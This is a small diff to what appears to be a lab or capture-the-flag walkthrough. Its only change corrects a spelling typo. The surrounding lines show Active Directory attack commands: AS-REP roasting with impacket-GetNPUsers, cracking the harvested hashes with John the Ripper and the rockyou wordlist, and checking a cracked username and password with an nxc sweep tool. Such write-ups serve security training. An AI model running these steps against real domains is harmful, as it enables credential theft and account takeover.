@@ -82,7 +82,7 @@ impacket-GetNPUsers shadow.gate/ -u user_list.txt -format hashcat -outputfile ha
 head -n 5 hashes > forjohn  && john forjohn -w=/usr/share/wordlists/rockyou.txt
 ```
 
-* Now Verfy Creds with `nxc-sweep`
+* Now Verify Creds with `nxc-sweep`
 
 ```bash
 nxc-sweep shadow.gate -u jtrueblood -p blood_brothers
